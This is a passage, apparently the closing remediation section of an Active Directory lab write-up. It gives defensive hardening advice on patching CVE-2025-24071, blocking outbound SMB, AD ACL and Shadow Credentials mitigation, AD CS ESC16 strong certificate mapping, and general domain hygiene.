461cxxxxxxxxxxxxxxxxxxxxxxxxf801
```

# 🛠️ Remediation
## 1. Patch Management (CVE-2025-24071)
- **Update Windows Systems**: Immediately apply the latest Microsoft security patches to address **CVE-2025-24071**. This prevents the Windows Shell from processing malicious `.library-ms` files that force NTLM authentication to unauthorized external servers.
- **Restrict Outbound SMB**: Block outbound traffic on **TCP port 445** at the network perimeter to prevent internal accounts from leaking NTLM hashes to attacker-controlled infrastructure.

## 2. Active Directory ACL Hardening
- **Audit High-Privilege Groups**: Review the membership and permissions of the **Service Account Managers** group. Remove **GenericAll** or **GenericWrite** permissions over other sensitive groups (like **Service Accounts**) to prevent unintended privilege inheritance.
- **Shadow Credentials Mitigation**: Restrict the ability of non-administrative users to modify the `msDS-KeyCredentialLink` attribute on user and computer objects, which prevents the **Shadow Credentials** technique.

## 3. AD CS Security (ESC16)
- **Enforce Strong Mapping**: Configure the `StrongCertificateBindingEnforcement` registry key to a value of **2** (Required) on all Domain Controllers. This prevents attackers from bypassing authentication via **UPN-swapping** (ESC16) by requiring a strict 1-to-1 mapping between certificates and accounts.
- **Template Monitoring**: Regularly audit Active Directory Certificate Services (AD CS) templates for misconfigurations, ensuring that security extensions are enabled and required for all issued certificates.

## 4. Environmental Hygiene
- **Strong Password Policies**: Enforce long, complex passwords for all domain users to increase the time and computational cost required for offline hash cracking.
- **NTP Synchronization**: Resolve the **7-hour clock-skew** on the Domain Controller. Consistent time synchronization is critical for Kerberos authentication security and accurate forensic logging.
- **Deploy Protected Users Group**: Add highly privileged accounts, such as **Administrator**, to the **Protected Users** group to restrict the use of weaker authentication protocols like NTLM.





